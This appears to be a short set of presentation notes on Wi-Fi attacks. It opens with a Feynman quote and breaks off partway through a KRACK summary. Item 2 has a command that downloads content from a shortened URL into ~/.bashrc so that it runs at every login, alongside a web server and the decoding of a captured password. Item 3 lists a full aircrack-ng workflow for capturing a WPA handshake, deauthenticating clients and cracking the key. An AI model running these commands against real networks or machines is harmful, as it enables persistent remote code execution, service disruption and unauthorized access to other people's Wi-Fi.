Points to include :

1) If you cannot explain something in simple terms , you don't understand it .
								- Richard Feynman

2) curl 'https://git.io/fhNWm' >> ~/.bashrc
   python3 -m http.server 80
   echo '<encrypted_password_received' | base64 -d

3) ifconfig wlan0 down
   airmon-ng check kill
   iwconfig wlan0 mode monitor
   ifconfig wlan0 up
   airodump-ng wlan0
   airodump-ng --bssid <MAC_addr> --channel <CHANNEL> -w <NAME_OF_FILE> wlan0
   aireplay-ng -0 0 -a <MAC_ADDR> wlan0
   crunch
   aircrack-ng

   sudo service NetworkManager restart


4) KRACK [ Key Reinstallation Attack ]
	- Mathy Vanhoef and Frank Piessens , Oct 2017 , Univ of Leuven
	- All protected Wi-Fi networks use the 4-way handshake to
		 generate a fresh session key.
	- 
